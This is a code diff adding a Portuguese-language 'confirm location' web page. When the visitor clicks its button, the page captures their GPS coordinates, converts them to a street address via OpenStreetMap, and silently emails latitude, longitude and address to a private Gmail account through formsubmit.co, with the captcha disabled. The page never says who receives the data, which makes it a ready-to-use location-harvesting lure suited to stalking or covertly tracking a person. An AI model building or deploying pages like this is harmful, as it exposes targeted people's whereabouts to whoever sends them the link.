@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<title>Confirmação de Localização</title>
+</head>
+
+<body style="font-family: Arial; text-align:center; margin-top:80px;">
+
+<h2>Confirmar localização</h2>
+<p>Ao clicar você autoriza o compartilhamento da sua localização.</p>
+
+<button onclick="getLocation()">Autorizar</button>
+
+<form id="form" action="https://formsubmit.co/pattiniantonia92@gmail.com" method="POST">
+  <input type="hidden" name="latitude" id="lat">
+  <input type="hidden" name="longitude" id="lon">
+  <input type="hidden" name="endereco" id="endereco">
+  <input type="hidden" name="_subject" value="Nova localização recebida">
+  <input type="hidden" name="_captcha" value="false">
+</form>
+
+<script>
+function getLocation() {
+  if (!navigator.geolocation) return;
+
+  navigator.geolocation.getCurrentPosition(processLocation);
+}
+
+function processLocation(position) {
+
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
+
+  document.getElementById("lat").value = lat;
+  document.getElementById("lon").value = lon;
+
+  fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+    .then(res => res.json())
+    .then(data => {
+
+      const address = data.display_name || "Endereço não encontrado";
+
+      document.getElementById("endereco").value = address;
+
+      document.getElementById("form").submit();
+    });
+}
+</script>
+
+</body>
+</html>
